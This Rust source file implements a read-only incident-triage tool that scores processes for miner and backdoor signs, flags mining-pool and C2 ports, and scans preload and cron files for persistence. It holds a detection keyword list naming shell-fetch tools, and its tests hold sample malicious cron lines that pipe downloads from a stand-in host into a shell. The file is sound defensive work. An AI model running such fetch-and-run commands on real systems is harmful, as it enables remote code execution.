//! `sn triage` — read-only incident snapshot. Never writes to the system (it
//! does persist its own JSON report under the state dir). Designed to return in
//! a few seconds on a box pinned at 100% CPU.

use std::collections::{HashMap, HashSet};
use std::os::unix::fs::MetadataExt;
use std::path::{Path, PathBuf};
use std::thread::sleep;
use std::time::Duration;

use anyhow::Result;
use snsec_common::ai::has_miner_marker;
use snsec_common::labels::Label;
use snsec_common::schema::{ProcInfo, TriageSummary};

use crate::evidence_parse;
use crate::state::State;
use crate::sys::{netstat, proc};
use crate::util;

/// Ports strongly associated with mining pools / common C2.
pub(crate) const BAD_OUT_PORTS: &[u16] = &[3333, 4444, 5555, 7777, 9999, 14444, 45700, 3357];

struct Suspect {
    info: ProcInfo,
    label_hint: Option<Label>,
}

/// Build the triage summary. `sample_ms` is the CPU sampling window.
pub fn run(state: &State, print: bool) -> Result<TriageSummary> {
    let ticks = proc::clock_ticks() as f64;
    let sample_ms = 300u64;

    // Two CPU snapshots to measure per-process and machine busy%.
    let first = proc::cpu_snapshot();
    let (t0, i0) = proc::cpu_total_idle().unwrap_or((0, 0));
    sleep(Duration::from_millis(sample_ms));
    let second = proc::cpu_snapshot();
    let (t1, i1) = proc::cpu_total_idle().unwrap_or((0, 0));

    let elapsed = sample_ms as f64 / 1000.0;
    let cpu_busy_pct = if t1 > t0 {
        100.0 * (1.0 - (i1.saturating_sub(i0)) as f64 / (t1 - t0).max(1) as f64)
    } else {
        0.0
    };

    let conns = netstat::all();
    let by_inode = netstat::by_inode(&conns);
    let listeners = netstat::Listeners::new(&conns);

    let mut suspects: Vec<Suspect> = Vec::new();
    for (&(pid, start), &cum2) in &second {
        let cum1 = first.get(&(pid, start)).copied().unwrap_or(cum2);
        let dcpu = cum2.saturating_sub(cum1) as f64;
        let cpu_pct = 100.0 * (dcpu / ticks) / elapsed; // % of one core

        let st = match proc::read_stat(pid) {
            Some(s) => s,
            None => continue,
        };
        let (exe, deleted) = proc::exe(pid);
        let cwd = proc::cwd(pid);
        // An owner that cannot be read is unknown, never root: it would point the
        // operator and the model at the wrong account.
        let user = proc::uid(pid).map_or_else(|| "?".to_string(), proc::username);
        let cmd = proc::cmdline(pid);
        let out_conns = outbound_conns(pid, &by_inode, &listeners);

        let (score, hint) = score_process(&st, &exe, deleted, &cwd, &cmd, cpu_pct, &out_conns);
        if score == 0 && cpu_pct < 50.0 {
            continue; // not interesting
        }

        suspects.push(Suspect {
            info: ProcInfo {
                pid,
                starttime: start,
                comm: st.comm.clone(),
                exe,
                cwd,
                user,
                cpu_pct: (cpu_pct * 10.0).round() / 10.0,
                out_conns,
                deleted_exe: deleted,
                score,
            },
            label_hint: hint,
        });
    }

    suspects.sort_by(|a, b| {
        b.info
            .score
            .cmp(&a.info.score)
            .then(b.info.cpu_pct.total_cmp(&a.info.cpu_pct))
    });
    suspects.truncate(10);

    let persistence = scan_persistence();
    let (disk_pct, inode_pct) = disk_usage("/");
    let label = decide_label(
        &suspects,
        &conns,
        disk_pct,
        inode_pct,
        proc::loadavg1(),
        proc::num_cpus(),
    );

    let summary = TriageSummary {
        label: label.as_str().to_string(),
        top_processes: suspects.iter().map(|s| s.info.clone()).collect(),
        persistence,
        load1: proc::loadavg1(),
        disk_pct,
        inode_pct,
        mem_used_pct: (proc::meminfo().unwrap_or_default().used_pct() * 10.0).round() / 10.0,
    };

    // Persist JSON for the hub / later commands.
    let file = state.dir.join(format!(
        "triage-{}.json",
        util::ts_compact(util::now_secs())
    ));
    let _ = std::fs::write(&file, serde_json::to_vec_pretty(&summary)?);
    // Also write a stable "latest" pointer.
    let _ = std::fs::write(
        state.dir.join("triage-latest.json"),
        serde_json::to_vec_pretty(&summary)?,
    );

    if print {
        print_summary(&summary, cpu_busy_pct);
    }
    Ok(summary)
}

/// The connections `pid` opened to a non-loopback peer, as `ip:port`. One a local
/// listener accepted is left out: its remote port is the client's choice, so a
/// client connecting from port 4444 must not make a web server look like a miner.
pub(crate) fn outbound_conns(
    pid: i32,
    by_inode: &HashMap<u64, netstat::Conn>,
    listeners: &netstat::Listeners,
) -> Vec<String> {
    proc::socket_inodes(pid)
        .into_iter()
        .filter_map(|ino| by_inode.get(&ino))
        .filter(|c| listeners.outbound(c))
        .map(|c| format!("{}:{}", c.remote, c.remote_port))
        .collect()
}

/// Does an `ip:port` connection go to a mining-pool / C2 port?
pub(crate) fn to_bad_port(conn: &str) -> bool {
    conn.rsplit(':')
        .next()
        .and_then(|p| p.parse::<u16>().ok())
        .is_some_and(|p| BAD_OUT_PORTS.contains(&p))
}

fn score_process(
    st: &proc::ProcStat,
    exe: &str,
    deleted: bool,
    cwd: &str,
    cmd: &[String],
    cpu_pct: f64,
    out_conns: &[String],
) -> (u32, Option<Label>) {
    let mut score = 0u32;
    let mut miner = false;
    // The LiteSpeed server's own processes: `openlitespeed` calls itself
    // `litespeed` and keeps its working directory in /tmp/lshttpd. Scored as
    // suspects they outranked the PHP workers that were actually burning the CPU.
    let lsws = is_lsws(exe, deleted);

    if deleted {
        score += 40;
    }
    if !lsws
        && (proc::is_suspicious_path(exe) || (!cwd.is_empty() && proc::is_suspicious_path(cwd)))
    {
        score += 40;
    }
    // A non-web process executing from a webroot is a strong backdoor signal.
    if proc::is_webroot_path(exe) && !is_web_worker(&st.comm, exe) {
        score += 30;
    }
    // comm vs exe basename mismatch (name spoofing).
    if let Some(base) = exe.rsplit('/').next()
        && !lsws
        && !base.is_empty()
        && !st.comm.is_empty()
        && !base.starts_with(&st.comm)
    {
        score += 20;
    }
    // A name that is not valid UTF-8: programs do not call themselves that.
    if st.comm.contains('\u{FFFD}') {
        score += 20;
    }
    // kernel-thread-looking name with a real userspace exe.
    if st.comm.starts_with('[') && !exe.is_empty() && st.ppid != 2 {
        score += 40;
        miner = true;
    }
    // outbound to a mining/C2 port.
    for c in out_conns {
        if to_bad_port(c) {
            score += 40;
            miner = true;
        }
    }
    // miner hints in cmdline/argv.
    if has_miner_marker(&cmd.join(" ")) {
        score += 50;
        miner = true;
    }
    // sustained high CPU from a non-service exe.
    if cpu_pct > 80.0 {
        score += 15;
    }

    let hint = if miner {
        Some(Label::Miner)
    } else if is_web_worker(&st.comm, exe) && cpu_pct > 70.0 && !out_conns.is_empty() {
        Some(Label::PhpBot)
    } else {
        None
    };
    (score, hint)
}

/// An executable of the LiteSpeed install (root's directory, not deleted).
fn is_lsws(exe: &str, deleted: bool) -> bool {
    !deleted && exe.starts_with("/usr/local/lsws/")
}

fn is_web_worker(comm: &str, exe: &str) -> bool {
    const NAMES: &[&str] = &["php-fpm", "lsphp", "httpd", "apache2", "php"];
    NAMES.iter().any(|n| comm.contains(n) || exe.contains(n))
}

fn decide_label(
    suspects: &[Suspect],
    conns: &[netstat::Conn],
    disk_pct: u8,
    inode_pct: u8,
    load1: f64,
    cores: usize,
) -> Label {
    let mut labels: Vec<Label> = suspects.iter().filter_map(|s| s.label_hint).collect();

    // Overloaded, and what burns CPU is PHP workers: a site that misbehaves (a
    // runaway script, wp-cron, a bot on a heavy page), not malware.
    let overloaded = load1
        >= (crate::watch::cpu::LOAD_ALERT_FACTOR * cores.max(1) as f64)
            .max(crate::watch::cpu::LOAD_ALERT_MIN);
    if overloaded
        && suspects.iter().any(|s| {
            snsec_common::ai::is_web_worker(&s.info.comm, "")
                && s.info.cpu_pct >= snsec_common::ai::RUNAWAY_CPU_PCT
        })
    {
        labels.push(Label::WebOverload);
    }

    if disk_pct >= 98 || inode_pct >= 98 {
        labels.push(Label::DiskFull);
    }

    // Many inbound established web connections concentrated in few IPs → L7.
    let per_remote = netstat::conns_per_remote(conns);
    if per_remote.values().any(|&n| n > 80) {
        labels.push(Label::DdosL7);
    }

    labels.sort_by_key(|l| l.as_str());
    labels.dedup_by_key(|l| l.as_str());
    match labels.len() {
        0 => Label::Unknown,
        1 => labels[0],
        _ => Label::Mixed,
    }
}

fn scan_persistence() -> Vec<String> {
    let root = Follow {
        within: Path::new("/etc"),
        owner: 0,
    };
    scan_persistence_in(
        Path::new("/etc/ld.so.preload"),
        &proc::persistence_files(),
        &root,
    )
}

/// What a start-up file that is not read is reported as.
const UNREAD: &str = "<not read: not a regular file, or too big>";

/// Which start-up file that is a symlink is read through it.
struct Follow<'a> {
    /// Only a link here is followed, and only to a file here: root's own `/etc`
    /// (on RHEL-family systems `/etc/rc.local` is a link to `rc.d/rc.local`).
    /// Spool crontabs belong to their users and are never read through a link.
    within: &'a Path,
    /// Who must own both the link and the file it leads to: root.
    owner: u32,
}

/// The text of a start-up file and the file it was read from. A link is read
/// through only as `follow` allows; a FIFO, a device or a big file never is.
fn read_startup(path: &Path, follow: &Follow) -> Option<(PathBuf, String)> {
    let meta = std::fs::symlink_metadata(path).ok()?;
    if !meta.file_type().is_symlink() {
        let text = crate::evidence::read_small(path)?;
        let real = std::fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf());
        return Some((real, text));
    }
    if meta.uid() != follow.owner || !path.starts_with(follow.within) {
        return None;
    }
    let target = std::fs::canonicalize(path).ok()?;
    if !target.starts_with(std::fs::canonicalize(follow.within).ok()?) {
        return None;
    }
    // Opened without following anything further and checked on the handle.
    let (text, owner) = crate::evidence::read_small_owned(&target)?;
    (owner == follow.owner).then_some((target, text))
}

/// Every entry of the preload file and the suspicious lines of the cron files,
/// as `path: line`. Files are read through the evidence reader (bounded, no
/// FIFO, invalid UTF-8 kept as U+FFFD, a symlink only as `follow` allows), and
/// one that it refuses is a hit of its own: a stray byte or an odd file type must
/// not hide what is in it. A file reached twice is read once. The lines go to
/// the hub in every report: secrets in them are masked before they are cut.
fn scan_persistence_in(preload: &Path, files: &[PathBuf], follow: &Follow) -> Vec<String> {
    let show = |path: &Path, line: &str| {
        format!(
            "{}: {}",
            path.display(),
            util::ellipsize(&evidence_parse::redact(line.trim()), 100)
        )
    };
    let mut hits = Vec::new();
    let mut seen: HashSet<PathBuf> = HashSet::new();
    if std::fs::symlink_metadata(preload).is_ok() {
        match read_startup(preload, follow) {
            Some((real, c)) => {
                seen.insert(real);
                hits.extend(
                    c.lines()
                        .map(str::trim)
                        .filter(|l| !l.is_empty())
                        .map(|l| show(preload, l)),
                );
            }
            None => hits.push(format!("{}: {UNREAD}", preload.display())),
        }
    }
    for path in files {
        // The preload file is reported whole above; a directory is not a file.
        if path == preload || std::fs::symlink_metadata(path).is_ok_and(|m| m.is_dir()) {
            continue;
        }
        let Some((real, content)) = read_startup(path, follow) else {
            if std::fs::symlink_metadata(path).is_ok() {
                hits.push(format!("{}: {UNREAD}", path.display()));
            }
            continue;
        };
        if !seen.insert(real) {
            continue;
        }
        hits.extend(
            content
                .lines()
                .filter(|l| is_suspicious_cron(l))
                .map(|l| show(path, l)),
        );
    }
    hits.truncate(30);
    hits
}

fn is_suspicious_cron(line: &str) -> bool {
    let l = line.trim();
    if l.is_empty() || l.starts_with('#') {
        return false;
    }
    const BAD: &[&str] = &[
        "curl",
        "wget",
        "tftp",
        "base64 -d",
        "base64 --decode",
        "/dev/tcp/",
        "python -c",
        "perl -e",
        "| sh",
        "|sh",
        "| bash",
        "|bash",
        "/tmp/",
        "/dev/shm/",
        ".onion",
        "pastebin",
        "transfer.sh",
    ];
    BAD.iter().any(|b| l.contains(b))
}

fn disk_usage(path: &str) -> (u8, u8) {
    use nix::sys::statvfs::statvfs;
    match statvfs(path) {
        Ok(s) => {
            let blocks = s.blocks() as f64;
            let bavail = s.blocks_available() as f64;
            let disk = if blocks > 0.0 {
                (100.0 * (1.0 - bavail / blocks)).round() as u8
            } else {
                0
            };
            let files = s.files() as f64;
            let favail = s.files_available() as f64;
            let inode = if files > 0.0 {
                (100.0 * (1.0 - favail / files)).round() as u8
            } else {
                0
            };
            (disk.min(100), inode.min(100))
        }
        Err(_) => (0, 0),
    }
}

fn print_summary(s: &TriageSummary, cpu_busy_pct: f64) {
    println!("== sn triage ==");
    println!(
        "label: {}   load1: {:.2}   cpu_busy: {:.0}%   ram: {:.0}%   disk: {}%   inode: {}%",
        s.label, s.load1, cpu_busy_pct, s.mem_used_pct, s.disk_pct, s.inode_pct
    );
    println!();
    println!(
        "{:<7} {:>6} {:<14} {:<26} {:<10} {:>5}",
        "PID", "CPU%", "COMM", "EXE", "USER", "SCORE"
    );
    for p in &s.top_processes {
        println!(
            "{:<7} {:>6.1} {:<14} {:<26} {:<10} {:>5}",
            p.pid,
            p.cpu_pct,
            util::ellipsize(&p.comm, 14),
            util::ellipsize(
                &if p.deleted_exe {
                    format!("{} (deleted)", p.exe)
                } else {
                    p.exe.clone()
                },
                26
            ),
            util::ellipsize(&p.user, 10),
            p.score
        );
        if !p.out_conns.is_empty() {
            println!(
                "        out: {}",
                util::ellipsize(&p.out_conns.join(", "), 80)
            );
        }
    }
    if !s.persistence.is_empty() {
        println!("\npersistence:");
        for h in &s.persistence {
            println!("  - {h}");
        }
    }
    println!("\nnext: review above, then `sn contain` to throttle suspects (reversible).");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_stray_byte_or_an_odd_file_does_not_hide_a_cron_foothold() {
        let dir = tempfile::tempdir().unwrap();
        let d = dir.path();
        // A comment with a byte that is not UTF-8, then the malicious line.
        let tab = d.join("crontab-u");
        std::fs::write(
            &tab,
            b"# caf\xe9\n* * * * * curl -s http://x/y.sh | sh\n0 1 * * * /usr/bin/true\n",
        )
        .unwrap();
        let fifo = d.join("fifo");
        nix::unistd::mkfifo(&fifo, nix::sys::stat::Mode::from_bits_truncate(0o600)).unwrap();
        let link = d.join("link");
        std::os::unix::fs::symlink(&tab, &link).unwrap();
        let big = d.join("big");
        std::fs::write(&big, vec![b'#'; 300 * 1024]).unwrap();
        let sub = d.join("crontabs");
        std::fs::create_dir(&sub).unwrap();
        let preload = d.join("ld.so.preload");
        std::fs::write(&preload, "/usr/lib/x/libhide.so\n\n/tmp/.k.so\n").unwrap();

        let files = [
            tab.clone(),
            fifo.clone(),
            link.clone(),
            big.clone(),
            sub,
            preload.clone(),
            d.join("gone"),
        ];
        let me = nix::unistd::geteuid().as_raw();
        let show = |p: &Path, rest: &str| format!("{}: {rest}", p.display());
        let hit = show(&tab, "* * * * * curl -s http://x/y.sh | sh");
        // Where links are not followed (a user's spool), the link is a hit of its
        // own. Returns at all: the FIFO is not waited on.
        let user = Follow {
            within: &d.join("etc"),
            owner: me,
        };
        assert_eq!(
            scan_persistence_in(&preload, &files, &user),
            [
                show(&preload, "/usr/lib/x/libhide.so"),
                show(&preload, "/tmp/.k.so"),
                hit.clone(),
                show(&fifo, UNREAD),
                show(&link, UNREAD),
                show(&big, UNREAD),
            ]
        );
        // Where they are (root's /etc; the test's account plays root), the link
        // leads to a file already read under its own name: it adds nothing.
        let root = Follow {
            within: d,
            owner: me,
        };
        assert_eq!(
            scan_persistence_in(&preload, &files, &root),
            [
                show(&preload, "/usr/lib/x/libhide.so"),
                show(&preload, "/tmp/.k.so"),
                hit,
                show(&fifo, UNREAD),
                show(&big, UNREAD),
            ]
        );
        // No preload file: nothing about it.
        assert!(scan_persistence_in(&d.join("none"), &[], &root).is_empty());
    }

    #[test]
    fn rc_local_is_read_through_roots_link_on_rhel_family_systems() {
        let dir = tempfile::tempdir().unwrap();
        let etc = dir.path().join("etc");
        std::fs::create_dir_all(etc.join("rc.d")).unwrap();
        let real = etc.join("rc.d/rc.local");
        std::fs::write(
            &real,
            "#!/bin/bash\ntouch /var/lock/subsys/local\n/usr/bin/curl -s http://x/m.sh | sh\n",
        )
        .unwrap();
        let link = etc.join("rc.local");
        std::os::unix::fs::symlink("rc.d/rc.local", &link).unwrap();
        // A link of root's that leads out of /etc.
        let outside = dir.path().join("rc.out");
        std::fs::write(&outside, "wget http://x/o.sh | sh\n").unwrap();
        let away = etc.join("away");
        std::os::unix::fs::symlink(&outside, &away).unwrap();

        let me = nix::unistd::geteuid().as_raw();
        let root = Follow {
            within: &etc,
            owner: me,
        };
        let none = etc.join("ld.so.preload");
        let show = |p: &Path, rest: &str| format!("{}: {rest}", p.display());
        let line = "/usr/bin/curl -s http://x/m.sh | sh";
        // Listed as `persistence_files` lists them: the file, then the link.
        assert_eq!(
            scan_persistence_in(&none, &[real.clone(), link.clone()], &root),
            [show(&real, line)]
        );
        // The link alone is read through, and named as it was listed.
        assert_eq!(
            scan_persistence_in(&none, std::slice::from_ref(&link), &root),
            [show(&link, line)]
        );
        assert_eq!(
            scan_persistence_in(&none, std::slice::from_ref(&away), &root),
            [show(&away, UNREAD)]
        );
        // A link someone else owns, or one where links are not followed, is not.
        let other = Follow {
            within: &etc,
            owner: me.wrapping_add(1),
        };
        assert_eq!(
            scan_persistence_in(&none, std::slice::from_ref(&link), &other),
            [show(&link, UNREAD)]
        );
        let elsewhere = Follow {
            within: &dir.path().join("var"),
            owner: me,
        };
        assert_eq!(
            scan_persistence_in(&none, std::slice::from_ref(&link), &elsewhere),
            [show(&link, UNREAD)]
        );
    }

    #[test]
    fn a_secret_in_a_flagged_cron_line_does_not_leave_the_box() {
        let dir = tempfile::tempdir().unwrap();
        let d = dir.path();
        let tab = d.join("root");
        std::fs::write(
            &tab,
            "*/5 * * * * wget -q --user=a --password=S3cr3tPw http://x/c.sh -O- | sh\n",
        )
        .unwrap();
        let preload = d.join("ld.so.preload");
        std::fs::write(&preload, "/usr/lib/x.so token=T0kenVal\n").unwrap();
        let root = Follow {
            within: d,
            owner: nix::unistd::geteuid().as_raw(),
        };
        let hits = scan_persistence_in(&preload, std::slice::from_ref(&tab), &root);
        assert_eq!(hits.len(), 2, "{hits:?}");
        for h in &hits {
            assert!(!h.contains("S3cr3tPw") && !h.contains("T0kenVal"), "{h}");
        }
        assert!(hits[1].contains("--password=***"), "{}", hits[1]);
        // The evidence's copy keeps the same text, and hashes as the line would.
        let line = hits[1].split_once(": ").unwrap().1;
        assert_eq!(evidence_parse::redact(line), line);
        assert_eq!(
            evidence_parse::redacted_line_sha(line),
            evidence_parse::redacted_line_sha(
                "*/5 * * * * wget -q --user=a --password=S3cr3tPw http://x/c.sh -O- | sh"
            )
        );
    }

    #[test]
    fn a_name_that_is_not_utf8_and_a_pool_connection_raise_the_score() {
        let st = |comm: &str| proc::ProcStat {
            pid: 10,
            comm: comm.into(),
            state: 'S',
            ppid: 1,
            utime: 0,
            stime: 0,
            starttime: 1,
        };
        let plain = score_process(&st("app"), "/srv/app", false, "/srv", &[], 0.0, &[]).0;
        let odd = score_process(
            &st("a\u{FFFD}p"),
            "/srv/a\u{FFFD}p",
            false,
            "/srv",
            &[],
            0.0,
            &[],
        )
        .0;
        assert_eq!(odd, plain + 20);
        let (s, hint) = score_process(
            &st("app"),
            "/srv/app",
            false,
            "/srv",
            &[],
            0.0,
            &["198.51.100.7:4444".into()],
        );
        assert_eq!((s, hint), (plain + 40, Some(Label::Miner)));
        assert!(to_bad_port("[2001:db8::1]:3333") && to_bad_port("1.2.3.4:14444"));
        assert!(!to_bad_port("1.2.3.4:443") && !to_bad_port("junk"));
    }

    #[test]
    fn litespeed_itself_is_no_suspect_and_a_php_worker_under_load_is_the_cause() {
        let st = |comm: &str| proc::ProcStat {
            pid: 10,
            comm: comm.into(),
            state: 'S',
            ppid: 1,
            utime: 0,
            stime: 0,
            starttime: 1,
        };
        // openlitespeed: comm `litespeed`, exe .../openlitespeed, cwd in /tmp/lshttpd.
        let lsws = "/usr/local/lsws/bin/openlitespeed";
        assert_eq!(
            score_process(&st("litespeed"), lsws, false, "/tmp/lshttpd", &[], 0.0, &[]).0,
            0
        );
        // The same names from a temp directory are still odd.
        let fake = "/tmp/x/openlitespeed";
        assert!(score_process(&st("litespeed"), fake, false, "/tmp/x", &[], 0.0, &[]).0 >= 60);

        let worker = |cpu_pct: f64| Suspect {
            info: ProcInfo {
                pid: 1,
                starttime: 1,
                comm: "lsphp".into(),
                exe: "/usr/local/php82/bin/lsphp".into(),
                cwd: "/home/a".into(),
                user: "a".into(),
                cpu_pct,
                out_conns: vec![],
                deleted_exe: false,
                score: 15,
            },
            label_hint: None,
        };
        let label = |cpu, load, cores| decide_label(&[worker(cpu)], &[], 40, 10, load, cores);
        // The reported case: load 47 with one worker at 100% (on 8 cores).
        assert_eq!(label(100.0, 47.0, 8), Label::WebOverload);
        assert_eq!(label(100.0, 5.0, 24), Label::Unknown, "not overloaded");
        assert_eq!(
            label(20.0, 47.0, 24),
            Label::Unknown,
            "no worker burns a core"
        );
    }
}
